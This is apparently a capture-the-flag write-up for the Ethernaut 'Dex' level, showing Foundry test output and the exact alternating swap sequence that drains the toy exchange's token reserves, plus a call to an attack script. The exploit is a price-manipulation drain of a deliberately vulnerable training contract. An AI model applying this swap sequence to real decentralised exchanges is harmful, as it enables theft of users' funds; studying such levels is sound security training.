# Dex

[Dex](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008)

<BR />

# Attack Test

The attack test  gives us the exact sequence of transfers necesary to perform the live attack.

```BASH
forge test -vv
```

```BASH
Token1 Supply:  110
Token2 Supply:  110
Token1 Player:  10
Token2 Player:  10
Swap Rate - Token1:Token2, 100: 100
Swap Rate - Token2:Token1, 100: 100
Swapping Token1->Token2:  10
=====================================================

Token1 Player:  0
Token2 Player:  20
Swap Rate - Token1:Token2, 100: 81
Swap Rate - Token2:Token1, 100: 122
Swapping Token2->Token1:  20
=====================================================

Token1 Player:  24
Token2 Player:  0
Swap Rate - Token1:Token2, 100: 127
Swap Rate - Token2:Token1, 100: 78
Swapping Token1->Token2:  24
=====================================================

Token1 Player:  0
Token2 Player:  30
Swap Rate - Token1:Token2, 100: 72
Swap Rate - Token2:Token1, 100: 137
Swapping Token2->Token1:  30
=====================================================

Token1 Player:  41
Token2 Player:  0
Swap Rate - Token1:Token2, 100: 159
Swap Rate - Token2:Token1, 100: 62
Swapping Token1->Token2:  41
=====================================================

Token1 Player:  0
Token2 Player:  65
Swap Rate - Token1:Token2, 100: 40
Swap Rate - Token2:Token1, 100: 244
Swapping Token2->Token1:  45
=====================================================

Token1 Player:  110
Token2 Player:  20

Test result: ok. 1 passed; 0 failed; finished in 2.09s
```

<BR />

# Live Attack

This is the required transfer summary:
```
Swapping Token1->Token2:  10
Swapping Token2->Token1:  20
Swapping Token1->Token2:  24
Swapping Token2->Token1:  30
Swapping Token1->Token2:  41
Swapping Token2->Token1:  45
```

```BASH
./attackDo.sh
```

<BR />

